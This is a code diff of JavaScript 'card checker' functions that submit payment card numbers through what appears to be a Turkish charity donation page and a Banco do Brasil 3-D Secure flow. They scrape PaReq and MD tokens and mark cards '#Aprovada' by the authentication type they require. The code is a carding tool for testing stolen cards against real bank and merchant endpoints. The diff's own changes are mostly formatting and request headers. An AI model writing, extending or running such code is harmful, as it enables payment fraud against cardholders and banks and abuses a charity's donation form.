@@ -1,6 +1,10 @@
 import got from "got";
-import { load } from "cheerio";
-import { CookieJar } from "tough-cookie";
+import {
+    load
+} from "cheerio";
+import {
+    CookieJar
+} from "tough-cookie";
 
 export async function checker_bb(card_params) {
     if (card_params.substring(0, 1) != '4' && card_params.substring(0, 1) != '5') {
@@ -44,7 +48,7 @@ export async function checker_bb(card_params) {
             responseType: 'text',
             resolveBodyOnly: true
         });
-        
+
         const html = load(req);
         const value_pareq = html('[name="PaReq"]').attr('value');
         const value_md = html('[name="MD"]').attr('value');
@@ -61,9 +65,6 @@ export async function checker_bb(card_params) {
                 'Accept-Language': 'pt-BR,pt;q=0.9',
                 'Connection': 'keep-alive',
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'www58.bb.com.br',
-                'Origin': `https://${c_url}`,
-                'Referer': `${secureUrl}/auth.bb`,
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
             },
             body: `_charset_=UTF-8&TermUrl=${encodeURIComponent(value_termurl)}&PaReq=${encodeURIComponent(value_pareq)}&MD=${encodeURIComponent(value_md)}`,
@@ -73,6 +74,7 @@ export async function checker_bb(card_params) {
             responseType: 'text',
             resolveBodyOnly: true
         });
+
         if (req_two.includes('Abra o aplicativo do BB em seu smartphone') == true) {
             return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ QR-CODE</font>`;
         }
@@ -85,8 +87,10 @@ export async function checker_bb(card_params) {
         if (error.code == 'ERR_NON_2XX_3XX_RESPONSE') {
             const req_tree = await client(`${secureUrl}/customer.bb`, {
                 headers: {
-                    'Host': c_url,
-                    'Origin': `https://${c_url}`,
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                    'Accept-Language': 'pt-BR,pt;q=0.9',
+                    'Connection': 'keep-alive',
+                    'Content-Type': 'application/x-www-form-urlencoded',
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
                 },
                 https: {
@@ -95,8 +99,9 @@ export async function checker_bb(card_params) {
                 responseType: 'text',
                 resolveBodyOnly: true
             });
+
             if (req_tree.includes('Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute') == true) {
-                return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ CLEAN 3ds</font>`;
+                return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ CLEAN</font>`;
             }
             if (req_tree.includes('Selecione um celular para receber') == true) {
                 return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ SMS</font>`;
@@ -130,7 +135,7 @@ export async function checker_sicredi(card_params) {
     const client = got.extend({
         cookieJar
     });
-    
+
     try {
         const req = await got.post('https://www.ihyavakfi.org.tr/bagis/bagis-yap/', {
             headers: {
@@ -178,7 +183,7 @@ export async function checker_sicredi(card_params) {
             responseType: 'text',
             resolveBodyOnly: true
         });
-        
+
         const html2 = load(req_two);
         const redirect = html2('[name="redirectForm"]').attr('action');
         const IdSession = html2('[name="IdSession"]').attr('value');
